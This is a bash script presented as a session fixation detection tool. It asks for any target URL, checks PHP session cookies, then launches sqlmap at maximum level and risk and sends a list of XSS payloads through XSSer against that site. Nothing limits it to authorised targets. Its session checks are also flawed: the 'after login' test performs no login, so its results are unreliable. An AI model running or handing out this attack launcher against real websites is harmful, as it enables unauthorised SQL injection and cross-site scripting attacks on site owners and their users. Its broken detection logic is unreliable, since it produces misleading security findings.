#!/bin/bash
# This is a comment

# Color variables
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# XSS Payloads
payloads=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg/onload=alert('XSS')>"
    "<iframe src='javascript:alert(`XSS`)'></iframe>"
    "<script>alert(String.fromCharCode(88,83,83))</script>"
    "<svg/onload=alert(String.fromCharCode(88,83,83))>"
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>"
    "<a href=javascript:alert(String.fromCharCode(88,83,83))>click me</a>"
)

# Function to perform initial request and get session cookie
get_initial_cookie() {
    curl -v -s -c initial_cookie.txt "$1" 2>&1
}

# Function to make a request with the initial session cookie
make_request_with_initial_cookie() {
    curl -v -s -b "initial_cookie.txt" "$1" 2>&1 > /dev/null
}

# Function to get the current session cookie
get_current_cookie() {
    curl -v -s -c - "$1" 2>&1
}

# Function to detect if session ID is predictable
detect_predictable_session_id() {
    echo "Detecting predictable Session ID..."
    # Make a request to get initial session cookie
    get_initial_cookie "$1"

    # Extract session ID from initial cookie
    initial_session_id=$(grep -oP '(?<=Set-Cookie: PHPSESSID=)[^;]*' initial_cookie.txt)

    # Make a request with the initial session cookie
    make_request_with_initial_cookie "$1"

    # Get the current session cookie
    get_current_cookie_response=$(get_current_cookie "$1")

    # Extract session ID from current cookie
    current_session_id=$(grep -oP '(?<=Set-Cookie: PHPSESSID=)[^;]*' <<< "$get_current_cookie_response")

    # Compare initial and current session IDs
    if [ "$initial_session_id" = "$current_session_id" ]; then
        echo -e "${RED}Predictable Session ID detected!${NC}"
    else
        echo -e "${GREEN}Session ID seems unpredictable.${NC}"
    fi
}

# Function to detect if session ID is not regenerated after login
detect_session_id_regeneration() {
    echo "Detecting Session ID regeneration after login..."
    # Make a request to get initial session cookie
    get_initial_cookie "$1"

    # Make a request with the initial session cookie
    make_request_with_initial_cookie "$1"

    # Get the current session cookie after login
    get_current_cookie_response=$(get_current_cookie "$1")

    # Extract session ID after login
    session_id_after_login=$(grep -oP '(?<=Set-Cookie: PHPSESSID=)[^;]*' <<< "$get_current_cookie_response")

    # Compare initial and session IDs after login
    if [ "$initial_session_id" = "$session_id_after_login" ]; then
        echo -e "${RED}Session ID not regenerated after login!${NC}"
    else
        echo -e "${GREEN}Session ID regenerated after login.${NC}"
    fi
}

# Function to attempt bypass using SQL injection
attempt_sql_injection() {
    echo "Attempting SQL Injection..."
    # Use sqlmap tool from Kali Linux to perform SQL injection
    sqlmap -u "$1" --batch --level=5 --risk=3
}

# Function to attempt bypass using XSS
attempt_xss() {
    echo "Attempting XSS (Cross-Site Scripting)..."
    # Use XSSer tool from Kali Linux to perform XSS with each payload
    for payload in "${payloads[@]}"; do
        echo "Using payload: $payload"
        xsser -u "$1" -p "$payload" --threads 10 --fuzzer
    done
}

# Main function
main() {
    echo "Session Fixation Detection Tool"
    echo "--------------------------------"

    # Prompt user for target URL
    read -p "Enter your target website: " target_url

    # Perform Session Fixation detection
    detect_predictable_session_id "$target_url"
    detect_session_id_regeneration "$target_url"

    # Attempt bypass using SQL injection
    attempt_sql_injection "$target_url"

    # Attempt bypass using XSS
    attempt_xss "$target_url"
}

# Call main function
main
